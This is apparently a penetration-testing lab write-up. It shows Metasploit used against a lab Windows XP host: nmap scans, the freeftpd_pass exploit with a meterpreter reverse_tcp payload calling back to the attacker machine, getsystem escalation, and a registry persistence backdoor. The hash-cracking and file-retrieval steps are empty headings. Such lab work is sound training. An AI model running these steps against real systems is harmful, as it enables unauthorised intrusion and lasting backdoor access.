#Metasploit Lab - RCM 8/18/2021

#Description

In this lab, you will have to use Metasploit and meterpreter against a real machine; this will help you become familiar with the Metasploit framework and its features.

#Goal

The goals of the lab are to:

    Identify the target machine on the network

    Find a vulnerable service

    Exploit the service by using Metasploit to get a meterpreter session

    Gather information from the machine by using meterpreter commands

    Retrieve the password hashes from the exploit machine

    Search for a file named \"Congrats.txt\"

#Tools

The best tools for this lab are:

    Nmap

    Metasploit (Metasploit 5 is recommended)

    John the Ripper

#Steps

1. Find target in the network
`nmap -sn 192.168.99.100/24`
Target IP: `192.168.99.12`

2. Identify available services on the target
`nmap -sV -sS -v 192.168.99.12 -oN morenmap.txt`
```
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FreeFTPd 1.0
22/tcp   open  ssh           WeOnlyDo sshd 2.1.8.98 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
MAC Address: 00:50:56:A2:59:7E (VMware)
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

3. Find vulnerable service in metasploit
`search freeftp` in metasploit

4. Configure module and exploit the machine
`use exploit/windows/ftp/freeftpd_pass`
`show options`
`set ftpuser anonymous`
`set RHOSTS 192.168.99.12`
`set RPORT 21`
`set payload windows/meterpreter/reverse_tcp`
`set exitfunc process`
`set lhost 192.168.99.100`
`set lport 4444`
`exploit`


5. Obtain system privileges on the machine

Remote access gained with meterpreter shell.
Obtain system privileges from ftpuser to system.
`getsystem`

6. Install a backdoor

Background meterpreter session with ctrl+Z and check session id with sessions -l

`use exploit/windows/local/persistence` > `show options`
`set reg_name backdoor`
`set exe_name backdoor`
`set startup SYSTEM`
`set session 1`
`set payload windows/meterpreter/reverse_tcp`
`set exitfunc process`
`set lhost 192.168.99.100`
`set lport 5555`
`set DisablePayloadHandler false`

7. Get password hashes and crack them


8. Gather info


9. Locate and download the congrats.txt file
